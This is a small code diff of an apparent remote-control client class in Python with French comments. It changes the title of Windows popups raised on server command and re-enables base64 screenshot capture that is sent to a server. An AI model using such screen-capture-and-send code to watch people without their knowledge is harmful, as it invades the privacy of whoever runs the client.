@@ -140,7 +140,7 @@ class Client:
         """Ouvre une popup native Windows avec un message."""
         try:
             for i in range(times):
-                ctypes.windll.user32.MessageBoxW(0, message, "Popup", 0x40)
+                ctypes.windll.user32.MessageBoxW(0, message, "alerte rouge !!!!!", 0x40)
             self.send_message("response", "Popup ouverte")
         except Exception as e:
             self.send_message("response", f"Erreur ouverture popup: {str(e)}")
@@ -157,8 +157,7 @@ class Client:
             buffer = io.BytesIO()
             screenshot.save(buffer, format="PNG")
             image_data = base64.b64encode(buffer.getvalue()).decode()
-            # image_data = "test"
-            
+
             # Send to server
             self.send_message("screenshot", image_data)
         except Exception as e:
